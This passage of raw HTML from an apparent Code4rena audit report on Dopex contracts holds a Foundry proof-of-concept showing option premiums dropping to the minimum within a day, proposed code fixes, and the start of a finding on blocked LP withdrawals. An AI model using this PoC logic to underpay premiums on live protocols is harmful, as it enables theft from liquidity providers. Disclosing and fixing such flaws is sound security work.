class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOptionPrice</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">timeToExpiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is option pricing initial :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 1 day afters</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiryAfter1Day</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is time to expiry after 1 day :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timeToExpiryAfter1Day</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOptionPrice</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">timeToExpiryAfter1Day</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is option pricing after 1 day :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// after 6 days</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiryAfter6Day</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is time to expiry after 6 day :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timeToExpiryAfter6Day</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getOptionPrice</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">100</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">timeToExpiryAfter6Day</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is option pricing after 6 day :&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">optionPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n</details>\n<p>Run the PoC :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-contract Unit --match-test testOptionPricingTiming -vvv</span></span></code></pre>\n<p>Log Output :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is the current price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  20000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is the strike</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  15000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is time to expiry initial :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  604800</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is option pricing initial :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  16481</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is time to expiry after 1 day :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  518400</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is option pricing after 1 day :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  10000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is time to expiry after 6 day :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  86400</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  What is option pricing after 6 day :</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  10000</span></span></code></pre>\n<p>It can be observed that users will pay minimum price (0.05%) even only after 1 day updating funding time pointer!</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To avoid this, fix the provided Black-Scholes option price observation time to funding epoch duration windows :</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function calculateBondCost(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 _rdpxBondId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) public view returns (uint256 rdpxRequired, uint256 wethRequired) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 rdpxPrice = getRdpxPrice();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (_rdpxBondId == 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      uint256 bondDiscount = (bondDiscountFactor *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        Math.sqrt(IRdpxReserve(addresses.rdpxReserve).rdpxReserve()) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        1e2) / (Math.sqrt(1e18)); // 1e8 precision</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      _validate(bondDiscount &lt; 100e8, 14);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      rdpxRequired =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((RDPX_RATIO_PERCENTAGE - (bondDiscount / 2)) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          _amount *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          DEFAULT_PRECISION) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (DEFAULT_PRECISION * rdpxPrice * 1e2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      wethRequired =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ((ETH_RATIO_PERCENTAGE - (bondDiscount / 2)) * _amount) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (DEFAULT_PRECISION * 1e2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      // if rdpx decaying bonds are being used there is no discount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      rdpxRequired =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (RDPX_RATIO_PERCENTAGE * _amount * DEFAULT_PRECISION) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (DEFAULT_PRECISION * rdpxPrice * 1e2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      wethRequired =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (ETH_RATIO_PERCENTAGE * _amount) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (DEFAULT_PRECISION * 1e2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 strike = IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .roundUp(rdpxPrice - (rdpxPrice / 4)); // 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 timeToExpiry = IPerpetualAtlanticVault(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      addresses.perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ).nextFundingPaymentTimestamp() - block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 timeToExpiry = IPerpetualAtlanticVault(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      addresses.perpetualAtlanticVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ).nextFundingPaymentTimestamp() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      IPerpetualAtlanticVault(addresses.perpetualAtlanticVault).fundingDuration();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (putOptionsRequired) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      wethRequired += IPerpetualAtlanticVault(addresses.perpetualAtlanticVault)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .calculatePremium(strike, rdpxRequired, timeToExpiry, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p>Also update the time expiry when purchase the options</p>\n<details>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function purchase(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    nonReentrant</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    onlyRole(RDPXV2CORE_ROLE)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    returns (uint256 premium, uint256 tokenId)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _whenNotPaused();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _validate(amount &gt; 0, 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    updateFunding();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 currentPrice = getUnderlyingPrice(); // price of underlying wrt collateralToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 strike = roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IPerpetualAtlanticVaultLP perpetualAtlanticVaultLp = IPerpetualAtlanticVaultLP(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        addresses.perpetualAtlanticVaultLP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Check if vault has enough collateral to write the options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 requiredCollateral = (amount * strike) / 1e8;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _validate(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      requiredCollateral &lt;= perpetualAtlanticVaultLp.totalAvailableCollateral(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 timeToExpiry = nextFundingPaymentTimestamp() - block.timestamp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 timeToExpiry = nextFundingPaymentTimestamp() - fundingDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Get total premium for all options being purchased</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    premium = calculatePremium(strike, amount, timeToExpiry, 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Transfer premium from msg.sender to PerpetualAtlantics vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    collateralToken.safeTransferFrom(msg.sender, address(this), premium);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    perpetualAtlanticVaultLp.lockCollateral(requiredCollateral);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    _updateFundingRate(premium);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // Mint the option tokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    tokenId = _mintOptionToken();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    optionPositions[tokenId] = OptionPosition({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strike: strike,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      amount: amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      positionId: tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    totalActiveOptions += amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    fundingPaymentsAccountedFor[latestFundingPaymentPointer] += amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    optionsPerStrike[strike] += amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    // record the number of options funding has been accounted for the epoch and strike</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    fundingPaymentsAccountedForPerStrike[latestFundingPaymentPointer][</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      strike</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ] += amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    emit Purchase(strike, amount, premium, to, msg.sender);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n</details>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/761#issuecomment-1734070352\">witherblock (Dopex) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-13-cannot-withdraw-rdpx-if-weth-withdrawn-is-zero\" style=\"position:relative;\"><a href=\"#m-13-cannot-withdraw-rdpx-if-weth-withdrawn-is-zero\" aria-label=\"m 13 cannot withdraw rdpx if weth withdrawn is zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/750\">[M-13] Cannot withdraw RDPX if WETH withdrawn is zero</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/750\">gjaldon</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2088\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1939\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1652\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1102\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/741\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/548\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/492\">HChang26</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/256\">rvierdiiev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L162\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L162</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L262-L266\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L262-L266</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L218-L229</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L346-L357\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L346-L357</a></p>\n<p><code>VaultLP</code> does not allow redemption of shares when it leads to 0 WETH being withdrawn. <code>VaultLP</code> can end up in a state where it has a small amount of WETH and most of its reserves is in RDPX instead. This can happen when most of its WETH is locked as collateral for Put Options and all these Put Options were exercised/settled due to RDPX price dropping.</p>\n<p>In this state, many depositors in the LP who have lost their WETH will not even be able to redeem their shares for the RDPX compensation.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 